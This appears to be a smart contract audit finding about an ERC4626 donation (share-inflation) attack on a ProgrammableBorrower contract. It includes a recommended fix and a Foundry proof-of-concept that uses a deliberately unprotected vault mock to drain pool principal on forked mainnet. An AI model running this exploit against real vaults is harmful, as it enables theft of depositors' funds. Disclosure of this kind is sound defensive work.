### Title
Unchecked ERC4626 share mint allows donation-assisted theft of programmable-borrower deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits idle pool assets into the configured ERC4626 vault but accepts whatever share amount the vault returns, including zero shares. [1](#0-0)  An unprivileged vault user can inflate the vault’s share price immediately before epoch start, causing the pool’s deposit to mint no meaningful shares while the underlying remains claimable by the attacker’s existing vault shares. [2](#0-1) 

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers surplus underlying to the programmable borrower and invokes `onStartEpoch`. [3](#0-2)  `onStartEpoch` then deposits the borrower contract’s entire raw underlying balance through `_depositToVault`. [4](#0-3) 

`_depositToVault` records the returned share amount only for the event; it never requires a nonzero result or checks that `convertToAssets(shares)` is approximately the deposited asset amount. [1](#0-0)  In an ERC4626 vault with an empty or attacker-dominated share supply, an attacker can seed the vault with one share, donate enough underlying to make one share worth more than the pool deposit, and make the pool’s `deposit()` round down to zero shares. [1](#0-0) 

The accounting baseline is set from the pre-deposit asset total rather than the shares actually received, so the lost deposit is initially treated as principal even though the programmable borrower holds no meaningful vault claim. [5](#0-4)  Later vault losses are only netted against reported interest and floored at zero, so the missing principal is not immediately burned from CDO NAV. [6](#0-5) 

### Impact Explanation
This breaks the solvency and fair mint/burn invariants: the pool transfers real underlying to the ERC4626 vault but receives no economically meaningful shares in return. [1](#0-0) 

For an initially empty vault and a programmable-borrower deposit of `X`, the attacker can deposit `1` unit to receive one share and donate at least `X` units. The borrower’s `X`-unit deposit then mints `floor(X * 1 / (X + 1)) == 0` shares, and redemption of the attacker’s one share pays approximately `2X + 1`, for a theft of `X` pool principal.

The stolen amount is bounded only by the programmable-borrower balance deposited during `onStartEpoch`. [4](#0-3)  Because the epoch baseline still records those assets as principal, the CDO can continue valuing the position at par until withdrawal liquidity or close-pool settlement exposes the shortfall. [7](#0-6) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have zero or sufficiently attacker-dominated supply before the pool deposit. In the general case, if the vault has supply `S`, assets `A`, and the attacker controls substantially all `S`, forcing a deposit of `X` to mint zero shares requires a donation `D` satisfying `X * S < A + D`.

No privileged role is needed: the attacker is merely an ERC4626 vault depositor and direct token donor, both explicitly unprivileged actions. [1](#0-0)  The only protocol precondition is that `IdleCDOEpochVariant` starts an epoch while the programmable borrower holds idle underlying, which is the normal epoch-start path. [8](#0-7) 

Existing checks do not prevent the issue: `onStartEpoch` is properly restricted to the CDO, but the attacker never calls it and only manipulates the public vault state before the CDO call. [9](#0-8) 

### Recommendation
Validate every ERC4626 deposit economically rather than trusting the returned share count.

- Revert when `shares == 0`.
- After `vault.deposit`, require `vault.convertToAssets(shares)` to be within a tightly bounded rounding tolerance of `_assetAmount`.
- Preferably persist a configured minimum shares-per-asset ratio or maximum deposit slippage for the selected vault.
- Configure only ERC4626 vaults with inflation-resistant virtual offsets or pre-seeded minimum liquidity.
- Include a regression test that deposits into a zero-offset vault after a first-depositor donation and asserts that the programmable-borrower transaction reverts. [1](#0-0)

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableERC4626 is ERC20 {
    IERC20 public immutable assetToken;

    constructor(IERC20 asset_) ERC20("Inflatable Share", "iSHARE") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) external view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * totalAssets() / supply;
    }

    // Standard round-down conversion with no virtual-share inflation defense.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        uint256 assetsBefore = totalAssets();
        shares = supply == 0 ? assets : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        shares = assets * totalSupply() / totalAssets();
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = shares * totalAssets() / totalSupply();
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    // Forked mainnet USDC used only as the real underlying asset.
    IERC20 internal constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    ProgrammableBorrower internal borrowerAdapter;
    InflatableERC4626 internal vault;

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal realBorrower = makeAddr("realBorrower");
    address internal attacker = makeAddr("attacker");

    // ProgrammableBorrower reads the underlying through IIdleCDOToken(idleCDO).
    function token() external view returns (address) {
        return address(USDC);
    }

    function testDepositShareInflationStealsEpochPrincipal() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        uint256 poolDeposit = 1_000_000e6;
        uint256 attackerSeed = 1;
        uint256 attackerDonation = poolDeposit;

        vault = new InflatableERC4626(USDC);

        // This test contract acts as the configured IdleCDO caller.
        borrowerAdapter = new ProgrammableBorrower();
        borrowerAdapter.initialize(
            address(vault),
            address(this),
            owner,
            manager,
            realBorrower,
            0
        );

        // Attacker seeds the empty vault and inflates the price of one share.
        deal(address(USDC), attacker, attackerSeed + attackerDonation);
        vm.startPrank(attacker);
        USDC.approve(address(vault), attackerSeed);
        vault.deposit(attackerSeed, attacker);
        USDC.transfer(address(vault), attackerDonation);
        vm.stopPrank();

        // IdleCDO has sent pool principal to the borrower adapter. The CDO-only
        // onStartEpoch call now deposits the full balance into the vault.
        deal(address(USDC), address(borrowerAdapter), poolDeposit);
        borrowerAdapter.onStartEpoch(0);

        assertEq(
            vault.balanceOf(address(borrowerAdapter)),
            0,
            "pool deposit minted zero shares"
        );

        // The attacker's single share now claims both the donation and pool funds.
        vm.prank(attacker);
        uint256 recovered = vault.redeem(1, attacker, attacker);

        assertEq(recovered, attackerSeed + attackerDonation + poolDeposit);
        assertEq(
            USDC.balanceOf(attacker),
            attackerSeed + attackerDonation + poolDeposit
        );
        assertEq(
            USDC.balanceOf(address(vault)),
            0,
            "pool principal drained"
        );
    }
}
